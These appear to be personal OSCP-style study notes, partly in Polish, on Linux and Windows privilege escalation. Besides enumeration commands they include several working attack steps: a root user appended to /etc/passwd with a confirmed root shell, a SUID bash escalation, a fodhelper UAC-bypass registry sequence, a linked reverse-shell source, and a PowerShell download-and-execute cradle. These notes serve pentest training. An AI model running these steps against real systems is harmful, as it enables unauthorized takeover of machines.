Linux:
	student@debian:~$ grep "CRON" /var/log/cron.log	
	student@debian:~$ ./unix-privesc-check.sh detailed
	student@debian:~$ hostname
	student@debian:~$ cat /etc/issue
	student@debian:~$ uname -a
	student@debian:~$ ps axu
	student@debian:~$ ip a
	student@debian:~$  /sbin/route

	student@debian:~$ ls -lah /etc/cron*
	student@debian:~$  cat /etc/crontab
	student@debian:~$ dpkg -l

	student@debian:~$  cat /etc/fstab

	student@debian:~$  find / -perm -u=s -type f 2>/dev/null


	jesli mozna edytowac /etc/passwd to:	
		student@debian:~$ openssl passwd evil
		AK24fcSx2Il3I
		student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
		student@debian:~$ su root2
		Password: evil
		root@debian:/home/student# id
		uid=0(root) gid=0(root) groups=0(root)



		n00b@victim:~$ cat /etc/issue
		Ubuntu 16.04.3 LTS \n \l

		n00b@victim:~$ uname -r 
		4.8.0-58-generic
		n00b@victim:~$ arch
		kali@kali:~$ searchsploit linux kernel ubuntu 16.04
		jesli jest suid bash to mozna:	
		-bash-5.0$ /usr/bin/bash -p

Windows:
	student@CLIENT251 C:\Users\student>whoami         whoami /priv
	student@CLIENT251 C:\Users\student>whoami /priv
	student@CLIENT251 C:\Users\student>net user student    
	student@CLIENT251 C:\Users\student>user   
	student@CLIENT251 C:\Users\student>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
	student@CLIENT251 C:\Users\student>tasklist /SVC   
	student@CLIENT251 C:\Users\student>ipconfig /all                                                             
	student@CLIENT251 C:\Users\student>netstat -ano
	student@CLIENT251 C:\Users\student>route print

	student@CLIENT251 C:\Users\student>netsh advfirewall show currentprofile  
	student@CLIENT251 C:\Users\student>schtasks /query /fo LIST /v   
	student@CLIENT251 C:\Users\student>wmic product get name, version, vendor   


	student@CLIENT251 c:\Tools\privilege_escalation\SysinternalsSuite>>accesschk.exe -uws "Everyone" "C:\Program Files" 
	PS C:\Tools\privilege_escalation\SysinternalsSuite>  driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path   


	student@CLIENT251 C:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check2.exe --dump -U  
	student@CLIENT251 C:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check2.exe --dump -G   



	interesting and to work more:

			1) Bypass UAC  (check registers etc look into oscp pdf p.555):
	
				student@CLIENT251 C:\Tools\privilege_escalation\windows-privesc-check-master>whoami /groups                                                                                         

				Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                                 
                                                                                                                                                                                    
				student@CLIENT251 C:\Tools\privilege_escalation\windows-privesc-check-master>    powershell.exe Start-Process cmd.exe -Verb runAs



				student@CLIENT251 C:\Tools\privilege_escalation\windows-privesc-check-master>whoami /groups                                                                                         
				opens new terminal with 
				Mandatory Label\High Mandatory Level Label          
	
				b) using fodhelper.exe to bypass  UAC 


				ading register after checking Process monitor and fodhelper.exe reginsters:
				REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command

				REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ

				REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f



			2) moze byc tak ze domyslenie aplikacj auruchami pliki jako root , jakis service jak wstaje i mozna ten serwis podmienic plikiem exe i ma sie revers shell jako root (strona 559 w pdf oscp):
			reverse shell (https://github.com/dev-frog/C-Reverse-Shell - https://github.com/dev-frog/C-Reverse-Shell/blob/master/re.cpp)

		

			3) moze byc tak ze nie uzywa sie w scierzkach uszu : "Program files"  , wtedy system szuka tak :

				C:\Program.exe
				C:\Program Files\My.exe
				C:\Program Files\My Program\My.exe
				C:\Program Files\My Program\My service\service.exe

			i mozna to wykosrzystac

			4)  USBPcap Case Study
				C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
				C:\Users\student\Desktop>driverquery /v
				kali@kali:~# searchsploit USBPcap




	execute without downloading:
	 	cmd: 
			> powershell -command (New-Object System.Net.WebClient).DownloadString('http://192.168.119.143:8000/PowerView.ps1')

			curl http://10.10.14.13:4444/PowerUp.ps1 -o PowerUp.ps1


			albo z uszami:
				powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.12:4444/PowerView.ps1')"

